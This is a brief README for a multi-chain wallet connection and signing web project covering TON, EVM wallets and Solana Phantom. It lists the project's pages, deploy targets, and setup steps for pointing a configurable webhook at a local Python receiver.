# Gigi Wallet Signing

Multi-chain wallet connection pages for TON, EVM, Solana.

## Features
✅ TON → tonconnect  
✅ EVM → MetaMask, Rabby, Trust  
✅ Solana → Phantom  
✅ Webhook integration to backend  
✅ Language selector  
✅ Animated backgrounds

## Pages
- `/public/sign.html` → TON  
- `/public/evm.html` → EVM  
- `/public/solana.html` → Solana

## Deploy
- Recommended: Render, Netlify, Vercel

## Setup
1. Clone repo  
2. Update `WEBHOOK_BASE` in `config.js` or via `.env` when building Docker image
3. Push to GitHub → deploy to Render

## Backend (example)
An example receiver is provided in `webhook_server.py`.

Run it locally with:

```bash
pip install -r ../requirements.txt
python ../webhook_server.py
```

Then set `WEBHOOK_BASE` to `http://localhost:5000`.
